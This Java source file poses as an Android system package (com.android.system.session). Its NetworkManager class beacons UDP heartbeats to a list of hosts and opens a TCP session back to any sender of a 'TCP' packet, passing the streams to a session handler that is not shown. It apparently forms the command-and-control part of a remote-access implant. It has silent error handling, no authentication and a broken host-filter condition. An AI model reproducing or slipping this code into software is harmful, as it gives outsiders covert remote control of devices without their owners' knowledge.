package com.android.system.session;

import com.android.system.utils.DataPack;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class NetworkManager {
    private static final byte[] defaultHeartBeatData = new byte[0];
    private static int defaultPort = 8000;
    private static short SIGNATURE = -13570; //0XCAFE
    private static short OPERATION_SYN = -1;
    private static short OPERATION_ACK = -2;
    private static short OPERATION_HEARTBEAT = 0;
    private static short OPERATION_CONNECT_HOST = 1;
    private static short OPERATION_LISTEN_HOST = 2;
    private static short OPERATION_ACCEPT_HOST = 3;
    private final SessionManager mSessionManager;
    private byte[] HeartBeatData = null;
    private boolean startStatus = false;
    private int HeartBeatDelay = 2000;
    private int TimeoutValue = 10000;
    private int localPort = 0;
    private List<String> mHostList = new ArrayList<>();
    private DatagramSocket mDatagramSocket = null;
    Thread mThread = null;

    Runnable mSessionRunner = new Runnable() {
        @Override
        public void run() {
            try {
                mDatagramSocket = new DatagramSocket(getLocalPort());
                final DatagramSocket ds = mDatagramSocket;

                final Timer timer = new Timer();
                timer.schedule(new TimerTask() {

                    @Override
                    public void run() {
                        if(!isStart()) {
                            timer.cancel();
                            return;
                        }
                        try {
                            for(String addr: mHostList) {
                                if(addr.indexOf("http://")==-1 || addr.indexOf("https://")==-1) {
                                    String host = "";
                                    int port = defaultPort;
                                    String[] host_port = addr.split(":");
                                    if (host_port.length >= 1) {
                                        host = host_port[0];
                                    }
                                    if (host_port.length >= 2) {
                                        try {
                                            port = Integer.parseInt(host_port[1]);
                                        } catch (Exception e) {
                                        }
                                    }
                                    //send udp heart beat
                                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                                    DataOutputStream dataOutputStream = new DataOutputStream(byteArrayOutputStream);
                                    try {
                                        dataOutputStream.write(getHeartBeatData());
                                    } catch (IOException e) {
                                        e.printStackTrace();
                                    }
                                    byte[] sendData = byteArrayOutputStream.toByteArray();
                                    ds.send(new DatagramPacket(sendData, sendData.length, InetAddress.getByName(host), port));
                                }
                            }
                        } catch (UnknownHostException e) {
                        } catch (IOException e) {
                        } catch (Exception e) {
                        } finally {
                            if(!isStart()) {
                                timer.cancel();
                            }
                        }
                    }
                }, 0, HeartBeatDelay);

                //receive udp package
                byte[] receiveData = new byte[0X2000];
                while(isStart()) {
                    DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);
                    try {
                        ds.receive(receivePacket);
                        receiveDatagramPackageHandler(receivePacket);
                    } catch (IOException e) {
                    }
                }
            } catch (SocketException e) {
            } catch (Exception e) {
            }
        }
    };

    public NetworkManager(SessionManager sessionManager) {
        mSessionManager = sessionManager;
    }

    public byte[] getHeartBeatData() {
        if(HeartBeatData == null) {
            return defaultHeartBeatData;
        }
        return HeartBeatData;
    }

    public void setHeartBeatData(byte[] heartBeatData) {
        HeartBeatData = heartBeatData;
    }

    public boolean isStart() {
        return startStatus;
    }

    public int getLocalPort() {
        return localPort;
    }

    public void setLocalPort(int localPort) {
        this.localPort = localPort;
    }

    public void addHost(String host) {
        mHostList.add(host);
    }

    public int getTimeoutValue() {
        return TimeoutValue;
    }

    public void setTimeoutValue(int timeoutValue) {
        TimeoutValue = timeoutValue;
    }

    public void removeHost(int index) {
        mHostList.remove(index);
    }

    public void clearHost() {
        mHostList.clear();
    }

    public int getHostCount() {
        return mHostList.size();
    }

    public String getHost(int index) {
        return mHostList.get(index);
    }

    public void start() {
        if(isStart()) {
            return;
        }
        startStatus = true;
        mThread = new Thread(mSessionRunner);
        mThread.start();
    }

    public void stop() {
        if(mDatagramSocket != null) {
            mDatagramSocket.close();
            mDatagramSocket = null;
        }
        if(mThread != null) {
            try {
                startStatus = false;
                mThread.join();
                mThread = null;
            } catch (InterruptedException e) {
            }
        }
    }

    private void receiveDatagramPackageHandler(DatagramPacket receivePacket) throws IOException {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(receivePacket.getData());
        DataInputStream dataInputStream = new DataInputStream(byteArrayInputStream);

        //read packet body
        int headLength = 0;
        String msg = new String(receivePacket.getData(), receivePacket.getOffset() + headLength, receivePacket.getLength()-headLength);
        String packetAddress = receivePacket.getAddress().getHostAddress();
        int packetPort = receivePacket.getPort();
//        if(operation == OPERATION_SYN) {
//            mDatagramSocket.send(new DatagramPacket(ackData, ackData.length, receivePacket.getAddress(), receivePacket.getPort()));
//        } else
        if(msg.equals("TCP")) {
            createTcpInstance(packetAddress, packetPort);
        }
    }

    private void createTcpInstance(final String address, final int port) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                Socket connectSocket = null;
                InputStream inputStream = null;
                OutputStream outputStream = null;
                try {
                    //connect host
                    connectSocket = new Socket(address,port);
                    inputStream = connectSocket.getInputStream();
                    outputStream = connectSocket.getOutputStream();

                    //handle session
                    while(mSessionManager.handleSession(inputStream,outputStream));
                } catch (IOException e) {
                } finally {
                    if(connectSocket != null) {
                        try {
                            connectSocket.close();
                        } catch (IOException e) {
                        }
                    }
                    if(inputStream != null) {
                        try {
                            inputStream.close();
                        } catch (IOException e) {
                        }
                    }
                    if(outputStream != null) {
                        try {
                            outputStream.close();
                        } catch (IOException e) {
                        }
                    }
                }
            }
        }).start();
    }

    private void listenTcpInstance(final String address,final int port, final int listenPort, final String uuid) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                ServerSocket serverSocket = null;
                Socket connectSocket = null;
                InputStream inputStream = null;
                OutputStream outputStream = null;
                boolean isListenSuccess = false;
                try {
                    serverSocket = new ServerSocket(listenPort);
                    serverSocket.setSoTimeout(getTimeoutValue());
                    connectSocket = serverSocket.accept();
                    isListenSuccess = true;

                    //send udp listen-complete pack
                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                    DataOutputStream dataOutputStream = new DataOutputStream(byteArrayOutputStream);
                    dataOutputStream.writeShort(SIGNATURE);
                    dataOutputStream.writeShort(OPERATION_ACCEPT_HOST);
                    dataOutputStream.writeShort(listenPort);
                    dataOutputStream.writeBytes(uuid);
                    byte[] sendData = byteArrayOutputStream.toByteArray();
                    mDatagramSocket.send(new DatagramPacket(sendData, sendData.length, InetAddress.getByName(address), port));

                    inputStream = connectSocket.getInputStream();
                    outputStream = connectSocket.getOutputStream();

                    //send uuid
                    DataPack.sendDataPack(outputStream, uuid.getBytes("UTF-8"));

                    //handle session
                    mSessionManager.handleSession(inputStream,outputStream);
                } catch (IOException e) {
                } finally {
                    if(!isListenSuccess && mDatagramSocket != null) {
                        //send udp listen-uncomplete pack
                        try {
                            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                            DataOutputStream dataOutputStream = new DataOutputStream(byteArrayOutputStream);
                            dataOutputStream.writeShort(SIGNATURE);
                            dataOutputStream.writeShort(OPERATION_ACCEPT_HOST);
                            dataOutputStream.writeShort(0);
                            dataOutputStream.writeBytes(uuid);
                            byte[] sendData = byteArrayOutputStream.toByteArray();
                            mDatagramSocket.send(new DatagramPacket(sendData, sendData.length, InetAddress.getByName(address), port));
                        } catch(IOException e){
                        }
                    }
                    if(serverSocket != null) {
                        try {
                            serverSocket.close();
                        } catch (IOException e) {
                        }
                    }
                    if(connectSocket != null) {
                        try {
                            connectSocket.close();
                        } catch (IOException e) {
                        }
                    }
                    if(inputStream != null) {
                        try {
                            inputStream.close();
                        } catch (IOException e) {
                        }
                    }
                    if(outputStream != null) {
                        try {
                            outputStream.close();
                        } catch (IOException e) {
                        }
                    }
                }
            }
        }).start();
    }
}
